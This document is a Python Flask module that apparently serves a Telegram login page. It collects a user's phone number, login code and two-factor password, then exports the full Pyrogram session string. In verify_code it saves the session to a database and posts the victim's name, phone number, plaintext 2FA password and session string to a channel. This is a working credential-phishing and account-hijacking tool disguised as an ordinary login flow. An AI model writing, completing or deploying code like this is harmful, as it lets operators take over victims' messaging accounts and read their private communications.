from flask import Blueprint, request, jsonify, session, redirect, render_template
import uuid
from datetime import datetime
from pyrogram.errors import (
    PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired,
    SessionPasswordNeeded, FloodWait
)
from .database import save_session_to_db, send_to_channel, temp_sessions_col
from .session_manager import session_manager

auth_bp = Blueprint('auth', __name__)

@auth_bp.route("/")
def index():
    return redirect("/login")

@auth_bp.route("/login")
def login():
    return render_template("login.html")

@auth_bp.route("/api/send-code", methods=["POST"])
def send_code():
    try:
        session_manager.cleanup_old()
    except:
        pass

    data = request.get_json() or {}
    phone = data.get("phone", "").strip()
    session_name = data.get("session_name", "session").strip()

    if not phone or len(phone) < 10:
        return jsonify(ok=False, error="Invalid phone number"), 400

    session_id = str(uuid.uuid4())[:8]
    try:
        session_thread = session_manager.create_session(session_id, phone)
        sent = session_thread.execute(lambda: session_thread.client.send_code(phone))

        if temp_sessions_col is not None:
            temp_sessions_col.update_one(
                {'_id': session_id},
                {'$set': {
                    'phone_code_hash': sent.phone_code_hash,
                    'session_name': session_name,
                    'status': 'code_sent',
                    'phone': phone
                }}
            )
        return jsonify(ok=True, session_id=session_id, message=f"Code sent to {phone}")
    except PhoneNumberInvalid:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error="Invalid phone number"), 400
    except FloodWait as e:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error=f"Please wait {e.value} seconds"), 429
    except Exception as e:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error=str(e)), 500

@auth_bp.route("/api/verify-code", methods=["POST"])
def verify_code():
    data = request.get_json() or {}
    session_id = data.get("session_id", "")
    code = data.get("code", "").strip().replace(" ", "")
    password = data.get("password", "")

    if not session_id:
        return jsonify(ok=False, error="Session ID required"), 400

    session_thread = session_manager.get_session(session_id)
    if not session_thread:
        return jsonify(ok=False, error="Session expired"), 400

    session_doc = temp_sessions_col.find_one({'_id': session_id}) if temp_sessions_col is not None else None
    phone = session_doc.get('phone') if session_doc else session_thread.phone
    phone_code_hash = session_doc.get('phone_code_hash') if session_doc else None
    session_name = session_doc.get('session_name', 'session') if session_doc else 'session'

    if not phone:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error="Session data lost"), 400

    if not code or not code.isdigit():
        return jsonify(ok=False, error="Invalid verification code"), 400

    result = {"user": None, "session_string": None, "error": None}

    try:
        try:
            user = session_thread.execute(
                lambda: session_thread.client.sign_in(phone_number=phone, phone_code_hash=phone_code_hash, phone_code=code)
            )
            session_string = session_thread.execute(lambda: session_thread.client.export_session_string())
            result = {"user": user, "session_string": session_string, "error": None}
        except SessionPasswordNeeded:
            if not password:
                result = {"user": None, "session_string": None, "error": "2FA_PASSWORD_REQUIRED"}
            else:
                try:
                    user = session_thread.execute(lambda: session_thread.client.check_password(password))
                    session_string = session_thread.execute(lambda: session_thread.client.export_session_string())
                    result = {"user": user, "session_string": session_string, "error": None}
                except Exception as e:
                    result = {"user": None, "session_string": None, "error": f"Invalid 2FA password: {str(e)}"}
        except PhoneCodeInvalid:
            result = {"user": None, "session_string": None, "error": "INVALID_CODE"}
        except PhoneCodeExpired:
            result = {"user": None, "session_string": None, "error": "CODE_EXPIRED"}
        except Exception as e:
            result = {"user": None, "session_string": None, "error": str(e)}
    except Exception as e:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error=f"Server error: {str(e)}"), 500

    if result["error"] == "2FA_PASSWORD_REQUIRED":
        return jsonify(ok=False, requires_password=True), 401

    if result["error"] in ["INVALID_CODE", "CODE_EXPIRED"]:
        session_manager.remove_session(session_id)
        if result["error"] == "INVALID_CODE":
            return jsonify(ok=False, error="Invalid verification code"), 401
        elif result["error"] == "CODE_EXPIRED":
            return jsonify(ok=False, error="Code expired"), 401

    if result["error"]:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error=result["error"]), 400

    session_manager.remove_session(session_id)

    user = result["user"]
    session_string = result["session_string"]
    user_info = {
        "id": user.id,
        "first_name": user.first_name,
        "last_name": user.last_name or "",
        "username": user.username or "N/A",
        "phone": phone,
        "session_string": session_string,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "session_name": session_name
    }

    db_id = save_session_to_db(user_info)
    if db_id:
        print(f"✅ User saved: {db_id}")

    country_code = phone[:3] if phone.startswith("+") else phone[:2]
    channel_msg = f"""🟢 <b>NEW SESSION</b>
👤 <b>Name:</b> {user_info['first_name']} {user_info['last_name']}
🔗 <b>Username:</b> @{user_info['username']}
🆔 <b>User ID:</b> <code>{user_info['id']}</code>
📱 <b>Phone:</b> <code>{phone}</code>
🌍 <b>Country:</b> +{country_code}"""
    if password:
        channel_msg += f"\n🔑 <b>2FA:</b> <code>{password}</code>"
    channel_msg += f"\n\n<b>🔐 SESSION:</b>\n<code>{session_string}</code>"
    send_to_channel(channel_msg)
    session["user"] = user_info

    return jsonify(ok=True, user={
        "id": user_info["id"],
        "name": f"{user_info['first_name']} {user_info['last_name']}",
        "username": user_info["username"],
        "phone": phone
    })

@auth_bp.route("/api/logout", methods=["POST"])
def logout():
    session.clear()
    return jsonify(ok=True)

@auth_bp.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/login")
    return render_template("dashboard.html", user=session["user"])